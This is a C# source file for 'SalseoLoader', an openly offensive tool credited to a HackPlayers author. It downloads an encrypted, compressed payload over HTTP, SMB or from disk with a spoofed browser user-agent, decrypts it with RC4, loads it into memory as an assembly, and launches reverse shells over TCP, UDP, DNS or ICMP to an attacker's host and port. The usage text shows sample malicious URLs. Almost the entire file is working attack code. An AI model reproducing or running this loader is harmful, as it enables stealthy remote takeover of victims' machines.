﻿/*
 * Created by SharpDevelop.
 * User: Luis
 * Date: 10/11/2018
 * Time: 0:05
 * 
 * To change this template use Tools | Options | Coding | Edit Standard Headers.
 */
using System;
using System.Collections;
using System.IO;
using System.Net;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.IO.Compression;
using System.Reflection;
namespace SalseoDecrypter
{
    class Program
    {
        static void main()
        {
            //#############################################################
            //########### Leyendo Variables de Entorno dll ################
            //#############################################################
            string varpass = null;
            string varpayload = null;
            string varshell = null;
            string varlhost = null;
            string varlport = null;
            if ((Environment.GetEnvironmentVariable("PASS")) != null) { varpass = Environment.GetEnvironmentVariable("PASS"); } else { };
            if ((Environment.GetEnvironmentVariable("PAYLOAD")) != null) { varpayload = Environment.GetEnvironmentVariable("PAYLOAD"); } else { };
            if ((Environment.GetEnvironmentVariable("SHELL")) != null) { varshell = Environment.GetEnvironmentVariable("SHELL"); } else { };
            if ((Environment.GetEnvironmentVariable("LHOST")) != null) { varlhost = Environment.GetEnvironmentVariable("LHOST"); } else { };
            if ((Environment.GetEnvironmentVariable("LPORT")) != null) { varlport = Environment.GetEnvironmentVariable("LPORT"); } else { };
            if (varpass != null & varpayload != null & varshell != null & varlhost != null) { string[] argumentos = { varpass, varpayload, varshell, varlhost, varlport }; Main(argumentos); };

        }
        static void Main(string[] args)
        {
            string banner = @"
  _____  ____  _     _____   ___   ___    
 / ___/ /    || |   / ___/  /  _] /   \   
(   \_ |  o  || |  (   \_  /  [_ |     |  
 \__  ||     || |___\__  ||    _]|  O  |  
 /  \ ||  _  ||     /  \ ||   [_ |     |  
 \    ||  |  ||     \    ||     ||     |  
  \___||__|__||_____|\___||_____| \___/   
                                          
 _       ___    ____  ___      ___  ____  
| |     /   \  /    ||   \    /  _]|    \ 
| |    |     ||  o  ||    \  /  [_ |  D  )
| |___ |  O  ||     ||  D  ||    _]|    / 
|     ||     ||  _  ||     ||   [_ |    \ 
|     ||     ||  |  ||     ||     ||  .  \
|_____| \___/ |__|__||_____||_____||__|\_|

";

            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write(banner);
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("                             By: CyberVaca@HackPlayers");

            if (args.Length <= 3)
            {
                // Ayuda();
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("[+] Usage:\n");
                Console.WriteLine("    [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseTCP LHOST LPORT");
                Console.WriteLine("    [-] SalseoLoader.exe password \\\\smbserver.com\\evil\\elfuckingmal.txt ReverseUDP LHOST LPORT");
                Console.WriteLine("    [-] SalseoLoader.exe password c:\\temp\\elfuckingmal.txt ReverseICMP LHOST");
                Console.WriteLine("\n[+] Shells availables:\n\n    [-] ReverseTCP\n    [-] ReverseUDP\n    [-] ReverseDNS\n    [-] ReverseICMP");
                System.Environment.Exit(1);

            }



            //################### Parametros del Loader y comprobacion de los argumentos introducidos ################### 
            string Salseo_Encriptado = null;
            string clave = args[0].ToString();
            byte[] xKey = Encoding.ASCII.GetBytes(clave);
            string Salseo_URL = args[1].ToString();
            string funcion = args[2].ToString().ToLower();
            if (funcion == "reversetcp") { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un puerto :("); Environment.Exit(1); } }
            if (funcion == "reverseudp") { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un puerto :("); Environment.Exit(1); } }
            if (funcion == "reversedns") { if (args.Length < 5) { Console.WriteLine("\n[-] Necesitas introducir un nombre de dominio :("); Environment.Exit(1); } }
            if (funcion == "reverseicmp") { if (args.Length < 4) { Console.WriteLine("\n[-] Necesitas introducir un puerto :("); Environment.Exit(1); } }
            if (funcion != "reversetcp" & funcion != "reversedns" & funcion != "reverseicmp" & funcion != "reverseudp") { Console.WriteLine("\n[-] Error en el tipo de shell :("); Environment.Exit(1); }
            Console.ForegroundColor = ConsoleColor.Gray;
            if (args[1].ToString().Substring(0, 4).ToLower() == "http") { Salseo_Encriptado = ClienteWeb.LeePayload(args[1].ToString()); }
            if (args[1].ToString().Substring(0, 2).ToLower() == "\\\\") { Console.WriteLine("[+] Leyendo datos via SMB..."); if (System.IO.File.Exists(Salseo_URL) == false) { Console.WriteLine("[-] Error: No se pudo leer el payload ¿ La ruta es correcta ?"); Environment.Exit(1); } Salseo_Encriptado = LeeArchivoSMBorLocal.Archivo(args[1].ToString()); }
            if (args[1].ToString().Substring(0, 4).ToLower() != "http" && args[1].ToString().Substring(0, 2).ToLower() != "\\\\") { Console.WriteLine("[+] Leyendo datos via LOCAL..."); if (System.IO.File.Exists(Salseo_URL) == false) { Console.WriteLine("[-] Error: No se pudo leer el payload ¿ La ruta es correcta ?"); Environment.Exit(1); } Salseo_Encriptado = LeeArchivoSMBorLocal.Archivo(args[1].ToString()); }
            //#############################################################
            //####################### Cargando dll ######################## 
            //#############################################################

            string hexadecimal = Zipea.Descomprime(Salseo_Encriptado);
            byte[] Final_Payload_encriptado = StringHEXToByteArray.Convierte(hexadecimal);
            byte[] Final_Payload = RC4.Decrypt(xKey, Final_Payload_encriptado);
            string clases = null;
            Console.WriteLine("[+] Desencriptando el salseo.");
            Assembly salsongo = Assembly.Load(Final_Payload);
            Console.WriteLine("[+] Cargando la salsa en memoria.");
            Console.WriteLine("[+] Namespace de Assembly : " + salsongo.GetName().Name);
            foreach (Type infoass in salsongo.GetTypes()) { var strclase = string.Format("{0}", infoass.Name); clases = strclase; };
            //Console.WriteLine("[+] Class de Assembly : " + clases);
            //######################## Foreach de los metodos ####################
            //#####################################################################
            Console.WriteLine("[+] Version: " + salsongo.GetName().Version.ToString());
            Console.ForegroundColor = ConsoleColor.White;
            //#############################################################

            //########################### LLamada a funcion Reversa ########################
            if (funcion == "reversetcp")
            {
                string LHOST = args[3].ToString();
                string LPORT = args[4].ToString();
                string[] argumentos = new string[] { LHOST + " " + LPORT };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("reversetcp");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            if (funcion == "reverseudp")
            {
                string LHOST = args[3].ToString();
                string LPORT = args[4].ToString();
                string[] argumentos = new string[] { LHOST + " " + LPORT };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("reverseudp");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            if (funcion == "reversedns")
            {
                string LHOST = args[3].ToString();
                string LPORT = args[4].ToString();
                string[] argumentos = new string[] { LHOST + " " + LPORT };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("reversedns");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }
            if (funcion == "reverseicmp")
            {
                string LHOST = args[3].ToString();
                string[] argumentos = new string[] { LHOST + " " };
                Type myType = salsongo.GetTypes()[0];
                MethodInfo Method = myType.GetMethod("reverseicmp");
                object myInstance = Activator.CreateInstance(myType);
                Method.Invoke(myInstance, new object[] { argumentos });
            }

        }
    }



    public class BiteArrayToHex
    {
        public static string Convierte(byte[] bytearray_a_convertir)
        {
            return (BitConverter.ToString(bytearray_a_convertir)).Replace("-", "").ToLower();
        }

    }

    public class BiteArrayFromArchivo
    {

        public static byte[] ExtraeBites(string Archivo_a_leer)
        {
            byte[] Bites_extraidos = System.IO.File.ReadAllBytes(Archivo_a_leer);
            return Bites_extraidos;
        }


    }

    public class StringHEXToByteArray
    {
        public static byte[] Convierte(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];

            for (int i = 0; i < NumberChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }

            return bytes;
        }
    }

    public class BitArrayToString
    {

        public static string Convierte(byte[] movidaaconvertir)
        {
            string a = "";
            foreach (Byte b in movidaaconvertir)
            {
                a += (b + " ");
            }
            return a;
        }

    }

    public class RC4
    {

        public static byte[] Encrypt(byte[] pwd, byte[] data)
        {
            int a, i, j, k, tmp;
            int[] key, box;
            byte[] cipher;

            key = new int[256];
            box = new int[256];
            cipher = new byte[data.Length];

            for (i = 0; i < 256; i++)
            {
                key[i] = pwd[i % pwd.Length];
                box[i] = i;
            }
            for (j = i = 0; i < 256; i++)
            {
                j = (j + box[i] + key[i]) % 256;
                tmp = box[i];
                box[i] = box[j];
                box[j] = tmp;
            }
            for (a = j = i = 0; i < data.Length; i++)
            {
                a++;
                a %= 256;
                j += box[a];
                j %= 256;
                tmp = box[a];
                box[a] = box[j];
                box[j] = tmp;
                k = box[((box[a] + box[j]) % 256)];
                cipher[i] = (byte)(data[i] ^ k);
            }
            return cipher;
        }

        public static byte[] Decrypt(byte[] pwd, byte[] data)
        {
            return Encrypt(pwd, data);
        }

        public static byte[] StringToByteArray(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

    }

    public class ClienteWeb
    {

        public static string LeePayload(string URL)
        {
            try
            {
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("[+] Leyendo datos via HTTP...");
                WebClient client = new WebClient();
                client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                Stream data = client.OpenRead(URL);
                StreamReader reader = new StreamReader(data);
                string Salseo_Encriptado = reader.ReadToEnd();
                data.Close();
                reader.Close();
                return Salseo_Encriptado;
            }
            catch
            {

                Console.WriteLine("[-] Error: No se pudo conectar con la URL proporcionada :(");
                Environment.Exit(1);
                return "[-] Error: No se pudo conectar con la URL proporcionada :(";

            }

        }
    }


    public class LeeArchivoSMBorLocal
    {

        public static string Archivo(string ruta)
        {
            return File.ReadAllText(ruta, Encoding.UTF8);

        }
    }

    public class Zipea
    {
        private static void CopyTo(Stream src, Stream dest)
        {
            byte[] bytes = new byte[4096];

            int cnt;

            while ((cnt = src.Read(bytes, 0, bytes.Length)) != 0)
            {
                dest.Write(bytes, 0, cnt);
            }
        }

        public static string Comprime(string movidaacomprimir)
        {

            byte[] inputBytes = Encoding.UTF8.GetBytes(movidaacomprimir);

            using (var outputStream = new MemoryStream())
            {
                using (var gZipStream = new GZipStream(outputStream, CompressionMode.Compress))
                    gZipStream.Write(inputBytes, 0, inputBytes.Length);
                var outputBytes = outputStream.ToArray();
                var outputbase64 = Convert.ToBase64String(outputBytes);
                return outputbase64;

            }
        }
        public static string Descomprime(string movidaadescomprimir)
        {
            byte[] gZipBuffer = Convert.FromBase64String(movidaadescomprimir);
            using (var msi = new MemoryStream(gZipBuffer))
            using (var mso = new MemoryStream())
            {
                using (var gs = new GZipStream(msi, CompressionMode.Decompress))
                {

                    CopyTo(gs, mso);
                }

                return Encoding.UTF8.GetString(mso.ToArray());
            }


        }
    }




}
